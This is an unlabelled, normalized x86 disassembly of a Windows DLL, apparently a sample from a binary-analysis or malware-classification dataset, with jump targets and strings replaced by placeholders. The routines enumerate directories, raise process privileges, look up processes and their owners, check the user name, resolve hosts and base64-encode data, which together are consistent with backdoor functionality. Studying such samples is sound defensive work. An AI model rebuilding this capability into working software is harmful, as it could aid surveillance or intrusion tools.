mov ecx [ esi + 0x44c ]
push edi
mov [ ebx + 0x44c ] ecx
push [ ebx + 0x448 ]
push [ esp + 0x1c ]
call [ SetFilePointer@IAT ]
push edi
lea eax [ esp + 0x2e4 ]
push eax
push [ ebx + 0x450 ]
lea eax [ ebx + 0x458 ]
push eax
push [ esp + 0x20 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x18 ]
push edi
push ebx
call [ memset@IAT ]
mov eax [ esi + 0x440 ]
sub eax [ esi + 0x448 ]
add esp 0xc
add eax 0x458
mov [ ebx ] eax
mov eax [ esi + 0x440 ]
sub eax [ esi + 0x448 ]
mov ecx [ esi + 0x444 ]
sbb ecx [ esi + 0x44c ]
mov [ ebx + 0x450 ] eax
mov [ ebx + 0x454 ] ecx
cmp ecx [ esi + 0x448 ]
jae r-xdata
push eax
call edi
pop ecx
pop ecx
lea eax [ esp + 0x2e0 ]
push eax
mov eax [ esp + 0x10 ]
add eax 0xfffffff8
push eax
call edi
pop ecx
pop ecx
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x2c ]
push eax
push 0x0
lea eax [ esp + 0x2f4 ]
push eax
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
mov eax [ esi + 0x448 ]
mov edx [ esi + 0x440 ]
mov ecx [ esi + 0x44c ]
sub edx eax
mov [ esp + 0x18 ] edx
mov edx [ esi + 0x444 ]
sbb edx ecx
cmp edx edi
ja r-xdata
call [ GetLastError@IAT ]
call sub_1000737c
push ebx
mov [ esp + 0x10 ] eax
call [ free@IAT ]
pop ecx
push esi
push [ esp + 0x10 ]
push edi
call sub_100058f2
mov ebx eax
cmp [ esp + 0xc ] edi
je r-xdata
add eax 0x1400
adc ecx edi
mov [ esi + 0x448 ] eax
mov [ esi + 0x44c ] ecx
jmp r-xdata
jb r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
push [ esp + 0xc ]
call [ LocalFree@IAT ]
push [ esi + 0x10 ]
jmp r-xdata
cmp [ esp + 0x18 ] 0x1400
jb r-xdata
mov edi [ esi + 0x14 ]
mov eax [ esp + 0x18 ]
call sub_100057fa
jmp r-xdata
sub_100067e7
push ebp
mov ebp esp
sub esp 0x894
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ wcslen@IAT ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x87c ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov [ ebp - 0x890 ] ecx
mov [ ebp - 0x88c ] ebx
mov [ ebp - 0x874 ] eax
mov [ ebp - 0x888 ] edi
call esi
pop ecx
push ebx
mov [ ebp - 0x878 ] eax
call esi
cmp [ ebx + eax * 2 - 0x2 ] 0x5c
pop ecx
je r-xdata
push [ ebp - 0x87c ]
mov ebx [ wcscpy@IAT ]
lea eax [ ebp - 0x418 ]
push eax
call ebx
lea eax [ ebp - 0x418 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x41a ] 0x5c
je r-xdata
inc [ ebp - 0x878 ]
lea eax [ ebp - 0x418 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x870 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x880 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x418 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x10
test [ ebp - 0x870 ] 0x10
je r-xdata
mov eax [ edi ]
inc eax
imul eax eax 0x230
push eax
mov eax [ ebp - 0x874 ]
push [ eax ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x844 ]
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x880 ]
call [ FindClose@IAT ]
mov ecx [ ebp - 0x874 ]
mov [ ecx ] eax
inc [ edi ]
mov ecx [ edi ]
imul ecx ecx 0x230
push 0x230
lea eax [ ecx + eax - 0x230 ]
push 0x0
push eax
mov [ ebp - 0x884 ] eax
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x87c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
lea eax [ ebp - 0x870 ]
push eax
push [ ebp - 0x880 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x844 ]
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x844 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
mov eax [ ebp - 0x878 ]
add esp 0xc
lea eax [ ebp + eax * 2 - 0x210 ]
push eax
push [ ebp - 0x884 ]
call ebx
mov edx [ ebp - 0x854 ]
mov eax [ ebp - 0x884 ]
pop ecx
pop ecx
xor ecx ecx
or ecx [ ebp - 0x850 ]
xor ebx ebx
mov [ eax + 0x210 ] ecx
or edx ebx
mov [ eax + 0x214 ] edx
mov ecx [ ebp - 0x870 ]
mov [ eax + 0x208 ] ecx
mov ecx [ ebp - 0x86c ]
mov [ eax + 0x218 ] ecx
mov ecx [ ebp - 0x868 ]
mov [ eax + 0x21c ] ecx
mov ecx [ ebp - 0x864 ]
mov [ eax + 0x220 ] ecx
mov ecx [ ebp - 0x860 ]
mov [ eax + 0x224 ] ecx
mov ecx [ ebp - 0x85c ]
mov [ eax + 0x228 ] ecx
mov ecx [ ebp - 0x858 ]
mov [ eax + 0x22c ] ecx
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
push [ ebp - 0x87c ]
lea eax [ ebp - 0x620 ]
push eax
call ebx
lea eax [ ebp - 0x620 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x622 ] 0x5c
je r-xdata
lea eax [ ebp - 0x620 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x844 ]
push eax
lea eax [ ebp - 0x620 ]
push eax
call [ wcsncat@IAT ]
mov eax [ edi ]
add esp 0xc
inc eax
imul eax eax 0x230
push eax
mov eax [ ebp - 0x874 ]
push [ eax ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x620 ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
mov ecx [ ebp - 0x874 ]
mov [ ecx ] eax
inc [ edi ]
mov edi [ edi ]
imul edi edi 0x230
push 0x230
lea edi [ edi + eax - 0x230 ]
push 0x0
push edi
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x87c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x844 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
mov eax [ ebp - 0x878 ]
add esp 0xc
lea eax [ ebp + eax * 2 - 0x210 ]
push eax
push edi
call ebx
xor eax eax
or eax [ ebp - 0x850 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x854 ]
mov [ edi + 0x210 ] eax
xor ebx ebx
or ecx ebx
mov [ edi + 0x214 ] ecx
mov eax [ ebp - 0x870 ]
mov [ edi + 0x208 ] eax
mov eax [ ebp - 0x86c ]
mov [ edi + 0x218 ] eax
mov eax [ ebp - 0x868 ]
mov ecx [ ebp - 0x890 ]
mov [ edi + 0x21c ] eax
mov eax [ ebp - 0x864 ]
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x860 ]
mov [ edi + 0x224 ] eax
mov eax [ ebp - 0x85c ]
mov [ edi + 0x228 ] eax
mov eax [ ebp - 0x858 ]
mov [ edi + 0x22c ] eax
mov edi [ ebp - 0x888 ]
push edi
push [ ebp - 0x874 ]
lea eax [ ebp - 0x620 ]
push eax
push [ ebp - 0x88c ]
call sub_100067e7
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
mov ebx [ wcscpy@IAT ]
sub_10006c95
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ wcslen@IAT ]
push edi
push [ ebp + 0x8 ]
call esi
mov edi [ malloc@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
call edi
push [ ebp + 0xc ]
mov ebx eax
call esi
lea eax [ eax + eax + 0x2 ]
push eax
call edi
add esp 0x10
mov edi eax
test ebx ebx
jne r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
push [ ebp + 0x8 ]
mov esi [ wcscpy@IAT ]
push ebx
call esi
push [ ebp + 0xc ]
push edi
call esi
mov esi [ _wcsupr@IAT ]
push ebx
call esi
push edi
call esi
push edi
push ebx
call [ wcsstr@IAT ]
add esp 0x20
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
jmp r-xdata
push edi
call [ free@IAT ]
pop ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
sar eax 0x1
lea eax [ ecx + eax * 2 ]
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
sub_10006d2f
push ebp
mov ebp esp
sub esp 0x684
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ wcscpy@IAT ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x680 ] ecx
mov ecx [ ebp + 0xc ]
push eax
mov [ ebp - 0x66c ] eax
mov [ ebp - 0x678 ] ecx
mov ecx [ ebp + 0x10 ]
lea eax [ ebp - 0x418 ]
push eax
mov [ ebp - 0x670 ] ecx
mov [ ebp - 0x67c ] edi
call ebx
mov esi [ wcslen@IAT ]
lea eax [ ebp - 0x418 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x41a ] 0x5c
je r-xdata
push r--data
push [ ebp - 0x66c ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x418 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x10
lea eax [ ebp - 0x418 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x668 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x674 ] eax
cmp eax 0xffffffff
je r-xdata
test [ ebp - 0x668 ] 0x10
lea eax [ ebp - 0x63c ]
jne r-xdata
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x678 ]
push eax
call sub_10006c95
lea eax [ ebp - 0x668 ]
push eax
push [ ebp - 0x674 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x63c ]
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x674 ]
call [ FindClose@IAT ]
push [ ebp - 0x66c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
mov ecx [ ebp - 0x680 ]
add esp 0xc
push edi
push [ ebp - 0x670 ]
lea eax [ ebp - 0x210 ]
push [ ebp - 0x678 ]
push eax
call sub_10006d2f
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
sub_10006e47
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x668 ]
push eax
push [ ebp - 0x674 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
inc eax
imul eax eax 0x230
push eax
mov eax [ ebp - 0x670 ]
push [ eax ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
test [ ebp - 0x668 ] 0x10
lea eax [ ebp - 0x63c ]
jne r-xdata
push [ ebp - 0x674 ]
call [ FindClose@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x10
mov ecx [ ebp - 0x670 ]
mov [ ecx ] eax
inc [ edi ]
mov edi [ edi ]
imul edi edi 0x230
push 0x230
lea edi [ edi + eax - 0x230 ]
push 0x0
push edi
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x66c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x678 ]
push eax
call sub_10006c95
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x210 ]
push eax
push edi
call ebx
xor eax eax
or eax [ ebp - 0x648 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x64c ]
mov [ edi + 0x210 ] eax
xor ebx ebx
or ecx ebx
mov ebx [ wcscpy@IAT ]
mov [ edi + 0x214 ] ecx
mov eax [ ebp - 0x668 ]
mov [ edi + 0x208 ] eax
mov eax [ ebp - 0x664 ]
mov [ edi + 0x218 ] eax
mov eax [ ebp - 0x660 ]
mov [ edi + 0x21c ] eax
mov eax [ ebp - 0x65c ]
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x658 ]
mov [ edi + 0x224 ] eax
mov eax [ ebp - 0x654 ]
mov [ edi + 0x228 ] eax
mov eax [ ebp - 0x650 ]
mov [ edi + 0x22c ] eax
mov edi [ ebp - 0x67c ]
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x63c ]
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x66c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
mov ecx [ ebp - 0x680 ]
add esp 0xc
push edi
push [ ebp - 0x670 ]
lea eax [ ebp - 0x210 ]
push [ ebp - 0x678 ]
push eax
call sub_10006d2f
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
sub_1000708e
push ebp
mov ebp esp
push ecx
lea eax [ ebx + 0x8 ]
push edi
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0x4 ] 0x7
jne r-xdata
mov eax [ ebx + 0x20 ]
test eax eax
jne r-xdata
mov edi [ ebx + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
and [ esi + 0x8 ] eax
mov [ ebx + 0x20 ] esi
test edi edi
jne r-xdata
mov eax ecx
and [ esi + 0x8 ] ecx
mov [ eax + 0x8 ] esi
jmp r-xdata
cmp [ edi + 0x4 ] 0x7
jne r-xdata
push [ ebp - 0x4 ]
call [ LeaveCriticalSection@IAT ]
pop edi
leave
retn
mov edi [ edi + 0x8 ]
lea eax [ edi + 0x220 ]
push eax
lea eax [ esi + 0x220 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ edi + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
jmp r-xdata
sub_1000711a
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi 0x9c
push esi
lea eax [ ebp - 0xa0 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] esi
mov esi [ GetVersionExA@IAT ]
push eax
call esi
test eax eax
jne r-xdata
cmp [ ebp - 0x90 ] 0x2
pop esi
jne r-xdata
lea eax [ ebp - 0xa0 ]
push eax
mov [ ebp - 0xa0 ] 0x94
call esi
xor eax eax
movzx eax [ ebp - 0x9c ]
movzx ecx [ ebp - 0x98 ]
shl ax 0x8
movzx eax ax
or eax ecx
movzx ecx [ ebp - 0xc ]
shl cx 0x8
movzx ecx cx
shl eax 0x10
or eax ecx
movzx ecx [ ebp - 0xa ]
or eax ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
sub_100071b9
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x18 ]
push eax
push 0x28
mov esi ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push esi
xor esi esi
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x20 ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
push esi
push 0x10
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10014571
leave
retn
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
mov al 0x1
call [ GetLastError@IAT ]
push [ ebp - 0x18 ]
mov esi eax
call [ CloseHandle@IAT ]
push esi
call [ SetLastError@IAT ]
jmp r-xdata
sub_10007266
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
xor eax eax
cmp [ esi ] 0x0
je r-xdata
push esi
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push esi
call [ inet_addr@IAT ]
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
push ecx
push [ eax ]
lea eax [ ebp - 0x4 ]
push eax
call [ memcpy@IAT ]
mov eax [ ebp - 0x4 ]
add esp 0xc
jmp r-xdata
leave
retn
cmp eax 0xffffffff
jne r-xdata
sub_100072aa
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x108 ] edi
cmp eax edi
je r-xdata
lea eax [ ebp - 0x110 ]
imul esi esi 0x3e8
push eax
push edi
push edi
lea eax [ ebp - 0x108 ]
push eax
push edi
mov [ ebp - 0x110 ] edi
mov [ ebp - 0x10c ] esi
call [ select@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn
lea edx [ ebp + 0xc ]
cmp ecx [ ebp - 0x108 ]
jne r-xdata
cmp [ ebp + ecx * 4 - 0x104 ] eax
je r-xdata
add edx 0x4
mov eax [ edx ]
cmp eax edi
jne r-xdata
cmp [ ebp - 0x108 ] 0x40
jae r-xdata
inc ecx
cmp ecx [ ebp - 0x108 ]
jb r-xdata
xor ecx ecx
cmp [ ebp - 0x108 ] edi
jbe r-xdata
mov [ ebp + ecx * 4 - 0x104 ] eax
inc [ ebp - 0x108 ]
sub_1000734e
push ebp
mov ebp esp
push ecx
test eax eax
jne r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x400
push eax
push 0x0
push 0x1300
call [ FormatMessageA@IAT ]
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetLastError@IAT ]
sub_1000737c
push ebp
mov ebp esp
push ecx
test eax eax
jne r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x400
push eax
push 0x0
push 0x1300
call [ FormatMessageW@IAT ]
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetLastError@IAT ]
sub_100073aa
push ebx
push esi
push 0x3
pop esi
mov [ edi + 0x3 ] 0x0
push r--data
call [ strlen@IAT ]
pop ecx
mov ebx eax
call [ rand@IAT ]
xor edx edx
div ebx
dec esi
mov al [ edx + r--data ]
mov [ edi + esi ] al
jne r-xdata
pop esi
pop ebx
retn
sub_100073da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
je r-xdata
xor eax eax
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
xor esi esi
push 0x0
push esi
push ebx
push 0x5
call [ ZwQuerySystemInformation@IAT ]
cmp eax 0xc0000004
je r-xdata
add esi 0x1000
push esi
push ebx
call [ realloc@IAT ]
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
test eax eax
jns r-xdata
mov edi [ wcslen@IAT ]
mov esi ebx
xor esi esi
mov eax [ esi ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call edi
pop ecx
movzx ecx [ esi + 0x38 ]
add eax eax
cmp ecx eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
call [ free@IAT ]
pop ecx
add esi eax
jne r-xdata
push [ ebp + 0x8 ]
call edi
push eax
push [ esi + 0x3c ]
push [ ebp + 0x8 ]
call [ _wcsnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ esi + 0x44 ]
test ecx ecx
je r-xdata
mov esi eax
jmp r-xdata
mov edx [ esi + 0x50 ]
mov [ ecx ] edx
push ebx
call [ free@IAT ]
pop ecx
mov eax esi
jmp r-xdata
sub_10007497
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
je r-xdata
xor eax eax
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
xor esi esi
push 0x0
push esi
push ebx
push 0x5
call [ ZwQuerySystemInformation@IAT ]
cmp eax 0xc0000004
je r-xdata
add esi 0x1000
push esi
push ebx
call [ realloc@IAT ]
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
test eax eax
jns r-xdata
mov edi [ wcslen@IAT ]
mov esi ebx
xor esi esi
mov eax [ esi ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call edi
pop ecx
movzx ecx [ esi + 0x38 ]
add eax eax
cmp ecx eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
call [ free@IAT ]
pop ecx
add esi eax
jne r-xdata
push [ ebp + 0x8 ]
call edi
push eax
push [ esi + 0x3c ]
push [ ebp + 0x8 ]
call [ _wcsnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov esi [ esi + 0x44 ]
jmp r-xdata
push ebx
call [ free@IAT ]
pop ecx
mov eax esi
jmp r-xdata
sub_10007546
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
xor ebx ebx
push ebx
push 0x400
mov [ ebp - 0x410 ] ecx
call [ OpenProcess@IAT ]
mov [ ebp - 0x414 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
lea ecx [ ebp - 0x40c ]
push ecx
push 0x8
push eax
mov [ ebp - 0x40c ] ebx
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ GetTokenInformation@IAT ]
lea eax [ ebp - 0x408 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x40c ]
mov [ ebp - 0x408 ] ebx
call esi
test eax eax
jne r-xdata
push [ ebp - 0x414 ]
call [ CloseHandle@IAT ]
pop esi
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push edi
push [ ebp - 0x408 ]
call [ malloc@IAT ]
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
pop edi
lea eax [ ebp - 0x408 ]
push eax
push [ ebp - 0x408 ]
push edi
push 0x1
push [ ebp - 0x40c ]
call esi
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax 0x100
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x418 ] eax
lea eax [ ebp - 0x420 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x204 ]
push eax
push [ edi ]
push ebx
call [ LookupAccountSidW@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x410 ]
push 0x40
lea eax [ ebp - 0x204 ]
push eax
push esi
call [ wcsncpy@IAT ]
xor eax eax
add esp 0xc
mov [ esi + 0x7e ] ax
inc ebx
sub_1000768f
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x48 ] 0x40
call [ GetUserNameA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call [ _stricmp@IAT ]
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
sub_100076da
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi eax
lea edx [ esi + edi - 0x2 ]
cmp esi edx
jae r-xdata
mov eax edi
push 0x3
cdq
pop edi
idiv edi
dec edx
je r-xdata
push ebx
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
and eax 0x3
shl eax 0x4
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov [ ecx + 0x2 ] 0x3d3d
dec edx
jne r-xdata
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
movzx ebx [ esi + 0x1 ]
and eax 0x3
add eax eax
shr ebx 0x4
mov al [ ebx + eax * 8 + r--data ]
mov [ ecx + 0x1 ] al
movzx eax [ esi + 0x1 ]
movzx ebx [ esi + 0x2 ]
and eax 0xf
shr ebx 0x6
mov al [ ebx + eax * 4 + r--data ]
mov [ ecx + 0x2 ] al
movzx eax [ esi + 0x2 ]
and eax 0x3f
mov al [ eax + r--data ]
mov [ ecx + 0x3 ] al
add esi 0x3
add ecx 0x4
cmp esi edx
jb r-xdata
pop ebx
mov eax ecx
sub eax [ ebp + 0x8 ]
pop edi
mov [ ecx ] 0x0
pop esi
pop ebp
retn
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
movzx edx [ esi + 0x1 ]
and eax edi
add eax eax
shr edx 0x4
mov al [ edx + eax * 8 + r--data ]
mov [ ecx + 0x1 ] al
movzx eax [ esi + 0x1 ]
and eax 0xf
mov al [ eax * 4 + r--data ]
mov [ ecx + 0x2 ] al
mov [ ecx + 0x3 ] 0x3d
jmp r-xdata
add ecx 0x4
sub_100077c9
push ebp
mov ebp esp
push ecx
